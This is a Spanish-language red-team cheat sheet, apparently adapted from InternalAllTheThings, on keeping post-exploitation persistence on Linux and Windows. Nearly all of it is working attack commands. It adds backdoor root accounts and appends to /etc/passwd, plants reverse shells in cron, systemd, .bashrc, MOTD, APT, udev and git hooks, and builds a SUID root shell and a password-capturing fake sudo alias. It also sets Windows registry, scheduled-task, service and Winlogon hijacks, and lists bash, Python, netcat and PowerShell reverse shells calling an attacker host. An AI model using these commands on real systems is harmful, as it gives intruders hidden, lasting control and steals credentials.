---
tags:
  - post-explotacion
  - persistencia
  - linux
  - windows
  - pentesting
fuente: "https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/"
licencia: MIT
---

# Persistencia Post-Explotación

> [!warning] Uso ético y autorizado. Ver [[📜 Fuentes y Licencias]].

Mantener acceso al sistema tras un reinicio o cierre de sesión.

---

# Linux

## Usuario root adicional

```bash
sudo useradd -ou 0 -g 0 backdoor
echo "backdoor:P@ssw0rd" | chpasswd

# Alternativa directa en /etc/passwd (si es escribible)
openssl passwd -1 -salt x hacker
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Crontab

```bash
# Reverse shell al reiniciar
(crontab -l; echo "@reboot sleep 30 && ncat <LHOST> <LPORT> -e /bin/bash") | crontab

# Cada minuto
(crontab -l; echo "* * * * * /tmp/.hidden/shell.sh") | crontab
```

## Servicio systemd

```bash
# Crear servicio de persistencia
cat > /etc/systemd/system/sysupdate.service <<EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable sysupdate.service
systemctl start sysupdate.service
```

## Clave SSH

```bash
# En el servidor víctima
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<tu_clave_publica>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Conexión desde atacante
ssh -i ~/.ssh/id_rsa user@<IP>
```

## .bashrc / .bash_profile

```bash
# Reverse shell silenciosa cuando el usuario abre terminal
echo 'nohup bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &' >> ~/.bashrc

# Alias falso de sudo para capturar contraseñas
echo "alias sudo='~/.hidden/fakesudo'" >> ~/.bashrc
```

## MOTD (Message of the Day)

```bash
echo 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' >> /etc/update-motd.d/00-header
```

## APT Hook

```bash
# Se ejecuta en cada apt-get update
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 4444 -e /bin/bash 2>/dev/null &"};' \
  > /etc/apt/apt.conf.d/99backdoor
```

## Udev (dispositivos USB)

```bash
echo 'ACTION=="add",SUBSYSTEM=="usb",RUN+="/bin/bash -c bash -i>&/dev/tcp/<LHOST>/<LPORT> 0>&1"' \
  > /etc/udev/rules.d/99-backdoor.rules
udevadm control --reload-rules
```

## Binario SUID personalizado

```bash
echo 'int main(void){setresuid(0,0,0);system("/bin/sh");}' > /tmp/suid.c
gcc /tmp/suid.c -o /tmp/.suid
chmod 4777 /tmp/.suid
```

## Git Hooks

```bash
# pre-commit en el repo objetivo
cat > .git/hooks/pre-commit <<EOF
#!/bin/bash
nohup bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &
EOF
chmod +x .git/hooks/pre-commit
```

---

# Windows

## Registro (usuario actual)

```powershell
# HKCU Run — se ejecuta al iniciar sesión del usuario
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

## Registro (sistema — requiere admin)

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

## Tarea programada

```powershell
# Cada minuto como SYSTEM
schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /ru SYSTEM /tr "C:\Windows\Temp\shell.exe"

# Al inicio del sistema
schtasks /create /sc onstart /tn "WinInit" /ru SYSTEM /tr "C:\Windows\Temp\shell.exe"
```

## Servicio Windows

```powershell
sc create Updater binPath= "C:\Windows\Temp\shell.exe" start= auto
sc start Updater
```

## Startup folder

```powershell
# Usuario actual
copy shell.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"

# Todos los usuarios (requiere admin)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

## Winlogon (HKLM — requiere admin)

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\shell.exe" /f
```

## Golden Ticket (AD — persistencia de dominio)

Ver [[Active Directory — Ataques]]

---

## Reverse shells de referencia

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
ncat <LHOST> <LPORT> -e /bin/bash

# PowerShell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.Encoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Flujo de trabajo

```
Linux:
  1. SSH key en authorized_keys    ← más silencioso
  2. Crontab @reboot               ← persistente
  3. Servicio systemd              ← difícil de detectar
  4. Usuario root adicional        ← acceso directo

Windows:
  1. Tarea programada como SYSTEM  ← más común
  2. Registro HKLM Run             ← simple
  3. Servicio Windows              ← persistente
  4. Golden Ticket (si hay AD)     ← persistencia de dominio
```

---

## Referencias
- [[🗺️ MOC Ciberseguridad y Redes]]
- [[Escalada de Privilegios Linux]]
- [[Escalada de Privilegios Windows]]
- [[Pivoting de Red]]
- Fuente: [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/) — MIT
